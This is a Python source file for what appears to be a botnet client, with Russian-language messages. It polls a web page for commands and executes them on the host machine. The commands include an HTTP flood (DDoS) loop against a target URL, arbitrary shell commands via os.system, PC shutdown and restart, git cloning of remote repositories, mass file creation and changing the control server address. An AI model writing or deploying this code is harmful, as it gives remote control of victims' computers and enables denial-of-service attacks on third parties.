from libs import *
import functions as fn

get_data = lambda val, com: com.replace(f"{val}: ", "")

def get_data_from_comline(url):
    response = requests.get(url)
    soup = BeautifulSoup(response.text, 'lxml')
    comnds = soup.find_all('p')
    return comnds[0].text

def fill_bsd_for_ddos_data(bsd):
    bsd["DDoS-data"]["url"] = ""
    bsd["DDoS-data"]["ddosIsStarted"] = False
    fn.set_data_to_json("bot_sys_data.json", bsd)

def dos(bsd, com_url):
    url = bsd["DDoS-data"]["url"]
    while bsd["DDoS-data"]["ddosIsStarted"] and not bsd["CloseApp"] and "ddos" in get_data_from_comline(com_url):
        bsd = fn.get_data_from_json("bot_sys_data.json")
        if fn.is_connected():
            try:
                requests.get(url)
                requests.post(url)
                print("ATTACK!!")
            except requests.exceptions.ConnectionError:
                print("Con. error")
        else:
            fill_bsd_for_ddos_data(bsd)

def procc_request(command, bsd):
    if "restartApps" in command:
        fn.restart_app()
    if "turnOffPCs" in command:
        os.system("shutdown -s")
    if "restartPCs" in command:
        os.system("shutdown /r /t 1")
    if "ddos" in command:
        bsd["DDoS-data"]["url"] = get_data("ddos", command)
        bsd["DDoS-data"]["ddosIsStarted"] = True
        fn.set_data_to_json("bot_sys_data.json", bsd)
    if "download" in command:
        os.system(f"git clone {get_data('download', command)}")
    if "open" in command:
        webbrowser.open_new(get_data("open", command))
    if "updateApps" in command:
         fn.print_method("ДОСТУПНО ОБНОВЛЕНИЯ ДЛЯ БОТА ADA")
    if "closeApps" in command:
        fn.close_app()
    if "printMessage" in command:
        fn.print_method(get_data("printMessage", command))
    if "sayMessage" in command:
        fn.say(get_data("sayMessage", command))
    if "createFile" in command:
        file_data = get_data("createFile", command).split("-")
        for i in range(int(file_data[1])):
            with open(str(i)+file_data[0], "w", encoding="utf8") as file:
                file.write(file_data[2])
                i += 1
    if "newAddress" in command:
        bsd["BNAP-Target"] = get_data("newAddress", command)
        fn.set_data_to_json("bot_sys_data.json", bsd)
        fn.restart_app()
    if "os" in command:
        os.system(get_data("os", command))

def accept_command(url, bsd):
    # try:
    comnds = get_data_from_comline(url).split(";")
    for comnd in comnds:
        procc_request(comnd, bsd)
    # except:
    #     fn.print_method("ОШИБКА с приложением бота для обновления и т.п.\nПерезапустите бота или обратитесь в службу поддержки по адресу: playmister00@gmail.com")

def start_bnap(url):
    bsd = fn.get_data_from_json("bot_sys_data.json")
    while not bsd["CloseApp"]:
        accept_command(url, bsd)
        bsd = fn.get_data_from_json("bot_sys_data.json")